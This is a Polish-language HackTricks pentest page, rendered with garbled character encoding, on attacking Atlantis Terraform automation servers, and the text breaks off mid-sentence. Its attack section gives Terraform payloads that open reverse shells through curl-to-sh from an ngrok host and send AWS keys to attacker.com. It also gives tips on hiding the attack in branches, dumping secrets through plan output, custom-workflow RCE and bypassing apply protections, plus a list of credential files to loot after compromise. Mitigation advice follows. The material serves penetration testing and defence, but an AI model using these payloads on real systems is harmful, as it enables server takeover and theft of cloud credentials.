# BezpieczeÅ„stwo Atlantis

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Atlantis pomaga w uruchamianiu terraformy z Å¼Ä…daÅ„ Pull Requests z serwera git.

![](<../.gitbook/assets/image (51).png>)

## Lokalne laboratorium

1. PrzejdÅº do **strony wydaÅ„ atlantis** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **pobierz** odpowiedniÄ… wersjÄ™.
2. UtwÃ³rz **token osobisty** (z dostÄ™pem do repozytorium) dla swojego uÅ¼ytkownika **github**.
3. Wykonaj polecenie `./atlantis testdrive`, a zostanie utworzone **repozytorium demo**, ktÃ³re moÅ¼na uÅ¼yÄ‡ do **komunikacji z atlantis**.
1. MoÅ¼esz uzyskaÄ‡ dostÄ™p do strony internetowej pod adresem 127.0.0.1:4141

## DostÄ™p do Atlantis

### PoÅ›wiadczenia serwera Git

**Atlantis** obsÅ‚uguje kilka hostÃ³w git, takich jak **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
JednakÅ¼e, aby uzyskaÄ‡ dostÄ™p do repozytoriÃ³w na tych platformach i wykonywaÄ‡ dziaÅ‚ania, musi mieÄ‡ pewne **uprzywilejowane uprawnienia** (przynajmniej uprawnienia do zapisu).\
[**Dokumentacja**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) zaleca utworzenie uÅ¼ytkownika na tych platformach specjalnie dla Atlantis, ale niektÃ³rzy ludzie mogÄ… uÅ¼ywaÄ‡ kont osobistych.

{% hint style="warning" %}
W kaÅ¼dym przypadku, z perspektywy atakujÄ…cego, **konto Atlantis** bÄ™dzie bardzo **interesujÄ…ce do skompromitowania**.
{% endhint %}

### Webhooki

Atlantis opcjonalnie uÅ¼ywa [**tajemnic webhookÃ³w**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) do weryfikacji, czy otrzymuje **legitymacyjne webhooki** od hosta Git.

Jednym sposobem potwierdzenia tego jest **dozwolanie Å¼Ä…daÅ„ tylko z okreÅ›lonych adresÃ³w IP** twojego hosta Git, ale Å‚atwiejszym sposobem jest uÅ¼ycie Tajemnicy Webhooka.

NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e chyba Å¼e uÅ¼ywasz prywatnego serwera github lub bitbucket, bÄ™dziesz musiaÅ‚ udostÄ™pniÄ‡ punkty koÅ„cowe webhooka w Internecie.

{% hint style="warning" %}
Atlantis bÄ™dzie **udostÄ™pniaÅ‚ webhooki**, wiÄ™c serwer git moÅ¼e wysyÅ‚aÄ‡ mu informacje. Z perspektywy atakujÄ…cego byÅ‚oby interesujÄ…ce dowiedzieÄ‡ siÄ™, **czy moÅ¼na wysyÅ‚aÄ‡ do niego wiadomoÅ›ci**.
{% endhint %}

### PoÅ›wiadczenia dostawcy <a href="#provider-credentials" id="provider-credentials"></a>

[Z dokumentacji:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis uruchamia TerraformÄ™, po prostu wykonujÄ…c polecenia `terraform plan` i `apply` na serwerze, na ktÃ³rym jest hostowany Atlantis. Podobnie jak w przypadku uruchamiania Terraformy lokalnie, Atlantis potrzebuje poÅ›wiadczeÅ„ dla konkretnego dostawcy.

To zaleÅ¼y od ciebie, jak [dostarczasz poÅ›wiadczenia](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) dla konkretnego dostawcy dla Atlantis:

* Charta Helm Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [ModuÅ‚ AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) majÄ… swoje wÅ‚asne mechanizmy do dostarczania poÅ›wiadczeÅ„ dostawcy. Przeczytaj ich dokumentacjÄ™.
* JeÅ›li uruchamiasz Atlantis w chmurze, wiele chmur ma sposoby udzielania dostÄ™pu do API chmury aplikacjom dziaÅ‚ajÄ…cym na nich, np.:
* [Role AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Wyszukaj "EC2 Role")
* [Konta usÅ‚ug instancji GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Wielu uÅ¼ytkownikÃ³w ustawia zmienne Å›rodowiskowe, np. `AWS_ACCESS_KEY`, gdzie dziaÅ‚a Atlantis.
* Inni tworzÄ… niezbÄ™dne pliki konfiguracyjne, np. `~/.aws/credentials`, gdzie dziaÅ‚a Atlantis.
* UÅ¼yj dostawcy [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs), aby uzyskaÄ‡ poÅ›wiadczenia dostawcy.

{% hint style="warning" %}
**Kontener**, w ktÃ³rym **dziaÅ‚a Atlantis**, prawdopodobnie bÄ™dzie zawieraÅ‚ uprzywilejowane poÅ›wiadczenia dostawcÃ³w (AWS, GCP, Github...), ktÃ³rymi Atlantis zarzÄ…dza za pomocÄ… Terraformy.
{% endhint %}

### Strona internetowa

DomyÅ›lnie Atlantis uruchamia **stronÄ™ internetowÄ… na porcie 4141 na localhost**. Ta strona pozwala tylko na wÅ‚Ä…czanie/wyÅ‚Ä…czanie aplikacji atlantis i sprawdzanie stanu planu repozytoriÃ³w oraz ich odblokowywanie (nie pozwala na modyfikowanie rzeczy, wiÄ™c nie jest zbyt przydatna).

Prawdopodobnie nie bÄ™dzie ona dostÄ™pna z Internetu, ale domyÅ›lnie **nie sÄ… wymagane Å¼adne poÅ›wiadczenia**, aby uzyskaÄ‡ do niej dostÄ™p (a jeÅ›li sÄ…, domyÅ›lne to `atlantis`:`atlantis`).

## Konfiguracja serwera

KonfiguracjÄ™ dla `atlantis server` moÅ¼na okreÅ›liÄ‡ za pomocÄ… flag wiersza poleceÅ„, zmiennych Å›rodowiskowych, pliku konfiguracyjnego lub mieszanki tych trzech opcji.

* MoÅ¼esz znaleÅºÄ‡ [**tutaj listÄ™ flag**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) obsÅ‚ugiwanych przez serwer Atlantis
* MoÅ¼esz znaleÅºÄ‡ [**tutaj, jak przeksztaÅ‚ciÄ‡ opcjÄ™ konfiguracji w zmiennÄ… Å›rodowiskowÄ…**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

WartoÅ›ci sÄ… **wybierane w tej kolejnoÅ›ci**:

1. Flagi
2. Zmienne Å›rodowiskowe
3. Plik konfiguracyjny

{% hint style="warning" %}
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e w konfiguracji moÅ¼na znaleÅºÄ‡ interesujÄ…ce wartoÅ›ci, takie jak **tokeny i hasÅ‚a**.
{% endhint %}

### Konfiguracja repozytoriÃ³w

NiektÃ³re konfiguracje wpÅ‚ywajÄ… na **sposÃ³b zarzÄ…dzania repozytoriami**. Jednak moÅ¼liwe, Å¼e **kaÅ¼de repozytorium wymaga rÃ³Å¼nych ustawieÅ„**, dlatego istniejÄ… sposoby okreÅ›lenia kaÅ¼dego repozytorium. Oto kolejnoÅ›Ä‡ priorytetÃ³w:

1. Plik [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Ten plik moÅ¼e byÄ‡ uÅ¼ywany do okreÅ›lenia, jak atlantis powinien traktowaÄ‡ repozytorium. Jednak domyÅ›lnie niektÃ³re klucze nie mogÄ… byÄ‡ tutaj okreÅ›lone bez odpowiednich flag.
1. Prawdopodobnie wym
#### Ochrona PR

Atlantis umoÅ¼liwia wskazanie, czy **PR** powinien byÄ‡ **`zatwierdzony`** przez innÄ… osobÄ™ (nawet jeÅ›li nie jest to ustawione w ochronie gaÅ‚Ä™zi) i/lub czy powinien byÄ‡ **`scalowalny`** (przeszedÅ‚ ochronÄ™ gaÅ‚Ä™zi) **przed uruchomieniem apply**. Z punktu widzenia bezpieczeÅ„stwa zaleca siÄ™ ustawienie obu opcji.

JeÅ›li `allowed_overrides` jest ustawione na True, te ustawienia mogÄ… byÄ‡ **nadpisane dla kaÅ¼dego projektu przez plik `/atlantis.yml`**.

#### Skrypty

Konfiguracja repozytorium moÅ¼e **okreÅ›laÄ‡ skrypty**, ktÃ³re majÄ… byÄ‡ uruchamiane [**przed**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**po**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) wykonaniu **workflow**.

Nie ma Å¼adnej opcji, ktÃ³ra pozwala na **okreÅ›lenie** tych skryptÃ³w w pliku **repo `/atlantis.yml`**.

#### Workflow

W konfiguracji repozytorium (konfiguracja po stronie serwera) moÅ¼na [**okreÅ›liÄ‡ nowy domyÅ›lny workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) lub [**utworzyÄ‡ nowe niestandardowe workflow**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** MoÅ¼na rÃ³wnieÅ¼ **okreÅ›liÄ‡**, ktÃ³re **repozytoria** majÄ… **dostÄ™p** do **nowo** utworzonych workflow.\
NastÄ™pnie moÅ¼na zezwoliÄ‡ na **okreÅ›lenie workflow** do uÅ¼ycia w pliku **atlantis.yaml** dla kaÅ¼dego repozytorium.

{% hint style="danger" %}
JeÅ›li flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, workflow moÅ¼na **okreÅ›liÄ‡** w pliku **`atlantis.yaml`** dla kaÅ¼dego repozytorium. Potencjalnie konieczne jest rÃ³wnieÅ¼, aby **`allowed_overrides`** okreÅ›laÅ‚o rÃ³wnieÅ¼ **`workflow`** w celu **nadpisania workflow**, ktÃ³re ma byÄ‡ uÅ¼ywane.\
To praktycznie daje **RCE w serwerze Atlantis dla kaÅ¼dego uÅ¼ytkownika, ktÃ³ry ma dostÄ™p do tego repozytorium**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Sprawdzanie zasad Conftest

Atlantis obsÅ‚uguje uruchamianie **serwerowych** [**zasad conftest**](https://www.conftest.dev/) na wyjÅ›ciu planu. Powszechne przypadki uÅ¼ycia tego kroku obejmujÄ…:

* Odmawianie korzystania z listy moduÅ‚Ã³w
* Sprawdzanie atrybutÃ³w zasobu podczas tworzenia
* Wykrywanie niezamierzonych usuniÄ™Ä‡ zasobÃ³w
* Zapobieganie ryzyku bezpieczeÅ„stwa (np. ujawnianie bezpiecznych portÃ³w publicznie)

MoÅ¼esz sprawdziÄ‡, jak to skonfigurowaÄ‡ w [**dokumentacji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Komendy Atlantis

[W **dokumentacji**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) znajdziesz opcje, ktÃ³re moÅ¼esz uÅ¼yÄ‡ do uruchomienia Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Ataki

{% hint style="warning" %}
JeÅ›li podczas eksploatacji napotkasz ten **bÅ‚Ä…d**: `Error: Error acquiring the state lock`

MoÅ¼esz go naprawiÄ‡, wykonujÄ…c:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Modyfikacja konfiguracji w nowym PR

JeÅ›li masz uprawnienia do zapisu w repozytorium, bÄ™dziesz mÃ³gÅ‚ utworzyÄ‡ na nim nowÄ… gaÅ‚Ä…Åº i wygenerowaÄ‡ PR. JeÅ›li moÅ¼esz **wykonaÄ‡ polecenie `atlantis plan`** (lub moÅ¼e jest ono wykonywane automatycznie), **bÄ™dziesz mÃ³gÅ‚ wykonaÄ‡ zdalne wykonanie kodu (RCE) na serwerze Atlantis**.

MoÅ¼esz to zrobiÄ‡, umieszczajÄ…c [**zewnÄ™trzne ÅºrÃ³dÅ‚o danych dla Atlantis**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Wystarczy umieÅ›ciÄ‡ Å‚adunek (payload) podobny do poniÅ¼szego w pliku `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Stealthier Attack

MoÅ¼esz przeprowadziÄ‡ ten atak nawet w **bardziej skryty sposÃ³b**, postÄ™pujÄ…c zgodnie z tymi sugestiami:

* Zamiast bezpoÅ›rednio dodawaÄ‡ rev shell do pliku terraform, moÅ¼esz **zaÅ‚adowaÄ‡ zewnÄ™trzny zasÃ³b**, ktÃ³ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Kod rev shell moÅ¼na znaleÅºÄ‡ w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zewnÄ™trznym zasobie uÅ¼yj funkcji **ref**, aby ukryÄ‡ **kod rev shell terraformu w gaÅ‚Ä™zi** wewnÄ…trz repozytorium, coÅ› w stylu: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Zamiast** tworzyÄ‡ **PR do mastera** w celu uruchomienia Atlantisa, **utwÃ³rz 2 gaÅ‚Ä™zie** (test1 i test2) i utwÃ³rz **PR z jednej do drugiej**. Po zakoÅ„czeniu ataku po prostu **usuÅ„ PR i gaÅ‚Ä™zie**.

### Atlantis plan Secrets Dump

MoÅ¼esz **wydobyÄ‡ tajne informacje uÅ¼ywane przez terraform** uruchamiajÄ…c `atlantis plan` (`terraform plan`) poprzez umieszczenie czegoÅ› takiego w pliku terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis apply RCE - Modyfikacja konfiguracji w nowym PR

JeÅ›li masz uprawnienia do zapisu w repozytorium, bÄ™dziesz mÃ³gÅ‚ utworzyÄ‡ na nim nowÄ… gaÅ‚Ä…Åº i wygenerowaÄ‡ PR. JeÅ›li moÅ¼esz **wykonaÄ‡ polecenie `atlantis apply`, bÄ™dziesz mÃ³gÅ‚ zdalnie wykonaÄ‡ kod (RCE) na serwerze Atlantis**.

Jednak zazwyczaj bÄ™dziesz musiaÅ‚ ominÄ…Ä‡ pewne zabezpieczenia:

* **MoÅ¼liwoÅ›Ä‡ scalenia**: JeÅ›li to zabezpieczenie jest ustawione w Atlantis, moÅ¼esz uruchomiÄ‡ **`atlantis apply` tylko wtedy, gdy PR moÅ¼na scaliÄ‡** (co oznacza, Å¼e zabezpieczenia gaÅ‚Ä™zi muszÄ… zostaÄ‡ ominiÄ™te).
* SprawdÅº potencjalne [**obejÅ›cia zabezpieczeÅ„ gaÅ‚Ä™zi**](broken-reference/)
* **Zatwierdzenie**: JeÅ›li to zabezpieczenie jest ustawione w Atlantis, **inny uÅ¼ytkownik musi zatwierdziÄ‡ PR**, zanim bÄ™dziesz mÃ³gÅ‚ uruchomiÄ‡ `atlantis apply`.
* DomyÅ›lnie moÅ¼na wykorzystaÄ‡ [**token Gitbota do ominiÄ™cia tego zabezpieczenia**](broken-reference/)

Uruchomienie **`terraform apply` na zÅ‚oÅ›liwym pliku Terraform z uÅ¼yciem** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Musisz tylko upewniÄ‡ siÄ™, Å¼e pewien Å‚adunek, na przykÅ‚ad taki jak poniÅ¼sze, znajduje siÄ™ w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
PostÄ™puj zgodnie z **sugestiami z poprzedniej techniki**, aby przeprowadziÄ‡ ten atak w **bardziej dyskretny sposÃ³b**.

### Wstrzykiwanie parametrÃ³w Terraform

Podczas uruchamiania `atlantis plan` lub `atlantis apply`, Terraform jest uruchamiany w tle, moÅ¼na przekazywaÄ‡ polecenia do Terraform z atlantis, komentujÄ…c coÅ› w ten sposÃ³b:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
CoÅ›, co moÅ¼esz przekazaÄ‡, to zmienne Å›rodowiskowe, ktÃ³re mogÄ… byÄ‡ pomocne przy omijaniu niektÃ³rych zabezpieczeÅ„. SprawdÅº zmienne Å›rodowiskowe Terraform w [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Niestandardowy workflow

Wykonanie **zÅ‚oÅ›liwych niestandardowych poleceÅ„ budowania** okreÅ›lonych w pliku `atlantis.yaml`. Atlantis uÅ¼ywa pliku `atlantis.yaml` z gaÅ‚Ä™zi Å¼Ä…dania wycofania, a **nie** z `master`.\
Ta moÅ¼liwoÅ›Ä‡ zostaÅ‚a wspomniana w poprzedniej sekcji:

{% hint style="danger" %}
JeÅ›li flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, moÅ¼na **okreÅ›liÄ‡** workflow w pliku **`atlantis.yaml`** kaÅ¼dego repozytorium. Potencjalnie konieczne jest rÃ³wnieÅ¼, aby **`allowed_overrides`** okreÅ›laÅ‚o rÃ³wnieÅ¼ **`workflow`**, aby **zastÄ…piÄ‡ workflow**, ktÃ³ry ma byÄ‡ uÅ¼ywany.

To w zasadzie daje **RCE w serwerze Atlantis dla kaÅ¼dego uÅ¼ytkownika, ktÃ³ry ma dostÄ™p do tego repozytorium**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### OminiÄ™cie zabezpieczeÅ„ planu/apply

JeÅ›li flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _ma_ skonfigurowane `apply_requirements`, repozytorium moÅ¼e **zmodyfikowaÄ‡ zabezpieczenia planu/apply, aby je ominÄ…Ä‡**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Przechwytywanie PR

JeÅ›li ktoÅ› wysyÅ‚a komentarze **`atlantis plan/apply` na twoje waÅ¼ne Å¼Ä…dania Å›ciÄ…gniÄ™cia**, spowoduje to uruchomienie terraformu w nieodpowiednim momencie.

Ponadto, jeÅ›li nie masz skonfigurowanej **ochrony gaÅ‚Ä™zi**, aby Å¼Ä…daÄ‡ **ponownej oceny** kaÅ¼dego Å¼Ä…dania Å›ciÄ…gniÄ™cia, gdy jest do niego **wysyÅ‚any nowy commit**, ktoÅ› moÅ¼e **napisaÄ‡ zÅ‚oÅ›liwe konfiguracje** (sprawdÅº poprzednie scenariusze) w konfiguracji terraformu, uruchomiÄ‡ `atlantis plan/apply` i uzyskaÄ‡ RCE.

Oto **ustawienie** w ochronie gaÅ‚Ä™zi Github:

![](<../.gitbook/assets/image (31).png>)

### Tajemnica webhooka

JeÅ›li uda ci siÄ™ **ukraÅ›Ä‡ tajemnicÄ™ webhooka** lub jeÅ›li **nie ma Å¼adnej tajemnicy webhooka**, moÅ¼na **wywoÅ‚aÄ‡ webhook Atlantisa** i **wywoÅ‚aÄ‡ polecenia atlantis** bezpoÅ›rednio.

### Bitbucket

Bitbucket Cloud **nie obsÅ‚uguje tajemnic webhooka**. MoÅ¼e to umoÅ¼liwiÄ‡ atakujÄ…cym **podszycie siÄ™ pod Å¼Ä…dania z Bitbucket**. Upewnij siÄ™, Å¼e zezwalasz tylko na adresy IP Bitbucket.

* Oznacza to, Å¼e **atakujÄ…cy** moÅ¼e tworzyÄ‡ **faÅ‚szywe Å¼Ä…dania do Atlantisa**, ktÃ³re wyglÄ…dajÄ… tak, jakby pochodziÅ‚y z Bitbucket.
* JeÅ›li okreÅ›lasz `--repo-allowlist`, mogÄ… one tylko tworzyÄ‡ faÅ‚szywe Å¼Ä…dania dotyczÄ…ce tych repozytoriÃ³w, wiÄ™c najwiÄ™ksze szkody, jakie mogÄ… wyrzÄ…dziÄ‡, to planowanie/wdraÅ¼anie w twoich wÅ‚asnych repozytoriach.
* Aby temu zapobiec, dodaj na listÄ™ dozwolonych [adresy IP Bitbucketa](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (patrz: Adresy IPv4 wychodzÄ…ce).

## Post-Eksploatacja

JeÅ›li udaÅ‚o ci siÄ™ uzyskaÄ‡ dostÄ™p do serwera lub przynajmniej uzyskaÅ‚eÅ› LFI, istnieje kilka interesujÄ…cych rzeczy, ktÃ³re warto sprÃ³bowaÄ‡ odczytaÄ‡:

* `/home/atlantis/.git-credentials` - zawiera dane dostÄ™powe do VCS
* `/atlantis-data/atlantis.db` - zawiera dane dostÄ™powe do VCS z dodatkowymi informacjami
* `/atlantis-data/repos/<nazwa_org>`_`/`_`<nazwa_repo>/<nr_pr>/<workspace>/<Å›cieÅ¼ka_do_katalogu>/.terraform/terraform.tfstate` - plik stanu Terraformu
* PrzykÅ‚ad: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` - zmienne Å›rodowiskowe
* `/proc/[2-20]/cmdline` - linia poleceÅ„ `atlantis server` (moÅ¼e zawieraÄ‡ poufne dane)

## Åšrodki zaradcze

### Nie uÅ¼ywaj na publicznych repozytoriach <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

PoniewaÅ¼ kaÅ¼dy moÅ¼e komentowaÄ‡ publiczne Å¼Ä…dania Å›ciÄ…gniÄ™cia, nawet przy wszystkich dostÄ™pnych Å›rodkach bezpieczeÅ„stwa, uruchamianie Atlantisa na publicznych repozytoriach bez odpowiedniej konfiguracji ustawieÅ„ bezpieczeÅ„stwa jest nadal niebezpieczne.

### Nie uÅ¼ywaj `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

JeÅ›li uÅ¼ywasz na publicznym repozytorium (co nie jest zalecane, patrz powyÅ¼ej), nie powinieneÅ› ustawiaÄ‡ `--allow-fork-prs` (domyÅ›lnie false), poniewaÅ¼ kaÅ¼dy moÅ¼e otworzyÄ‡ Å¼Ä…danie Å›ciÄ…gniÄ™cia z wÅ‚asnej kopii do twojego repozytorium.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis wymaga okreÅ›lenia listy repozytoriÃ³w, z ktÃ³rych bÄ™dzie akceptowaÄ‡ webhooki za pomocÄ… flagi `--repo-allowlist`. Na przykÅ‚ad:

* Konkretne repozytoria: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* CaÅ‚a twoja organizacja: `--repo-allowlist=github.com/runatlantis/*`
* Wszystkie repozytoria w twojej instalacji GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Wszystkie repozytoria: `--repo-allowlist=*`. Przydatne, gdy jesteÅ› w chronionej sieci, ale niebezpieczne bez ustawienia tajemnicy webhooka.

Ta flaga zapewnia, Å¼e twoja instalacja Atlantisa nie jest uÅ¼ywana z repozytoriami, ktÃ³rymi nie zarzÄ…dzasz. SzczegÃ³Å‚owe informacje znajdujÄ… siÄ™ w `atlantis server --help`.

### Ochrona planowania Terraformu <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

JeÅ›li atakujÄ…cy, skÅ‚adajÄ…cy Å¼Ä…dania Å›ciÄ…gniÄ™cia z zÅ‚oÅ›liwym kodem Terraformu, znajduje siÄ™ w twoim modelu zagroÅ¼eÅ„, musisz wiedzieÄ‡, Å¼e zatwierdzenia `terraform apply` to za maÅ‚o. MoÅ¼liwe jest uruchomienie zÅ‚oÅ›liwego kodu w `terraform plan`, korzystajÄ…c z [ÅºrÃ³dÅ‚a danych zewnÄ™trznych](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) lub podajÄ…c zÅ‚oÅ›liwego dostawcÄ™. Taki kod moÅ¼e wyciekaÄ‡ twoje poÅ›wiadczenia.

Aby temu zapobiec, moÅ¼esz:

1. WbudowaÄ‡ dostawcÃ³w w obraz Atlantisa lub hostowaÄ‡ je i zablokowaÄ‡ wychodzÄ…cy ruch w produkcji.
2. WdroÅ¼yÄ‡ protokÃ³Å‚ rejestru dostawcÃ³w wewnÄ™trznie i zablokowaÄ‡ publiczny ruch wychodzÄ…cy, w ten sposÃ³b kontrolujÄ…c, kto ma uprawnienia do zapisu w rejestrze.
3. ZmodyfikowaÄ‡ [konfiguracjÄ™ repozytorium po stronie serwera](https://www.runatlantis.io/docs/server-side-repo-config.html) w kroku `plan`, aby sprawdzaÄ‡, czy nie uÅ¼ywane sÄ… niedozwolone dostawcy lub ÅºrÃ³dÅ‚a danych lub czy PR-y nie pochodzÄ… od niedozwolonych uÅ¼ytkownikÃ³w. W tym momencie moÅ¼na rÃ³wnieÅ¼ dodaÄ‡ dodatkowÄ… walidacjÄ™, na przykÅ‚ad wymaganie "kciuka w gÃ³rÄ™" dla PR przed kontynuacjÄ… `plan`. Przydatne moÅ¼e byÄ‡ uÅ¼ycie Conftest.

### Tajemnice webhooka <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis powinien byÄ‡ uruchamiany z ustawionymi tajemnicami webhooka za pomocÄ… zmiennych Å›rodowiskowych `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Nawet jeÅ›li ustawiona jest flaga `--repo-allowlist`, bez tajemnicy webhooka atakujÄ…cy moÅ¼e wysyÅ‚aÄ‡ Å¼Ä…dania do Atlantisa podszywajÄ…c siÄ™ pod repozytorium, ktÃ³re jest na liÅ›cie dozwolonych. Tajemnice webhooka zapewniajÄ…, Å¼e Å¼Ä…dania webhooka faktycznie pochodzÄ… od twojego dostawcy VCS (GitHub lub GitLab).

JeÅ›li uÅ¼ywasz Azure DevOps, zamiast tajemnic webhooka dodaj podstawowÄ… nazwÄ™ uÅ¼ytkownika i hasÅ‚o.

### Podstawowe uwierzytelnianie Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps obsÅ‚uguje wysyÅ‚
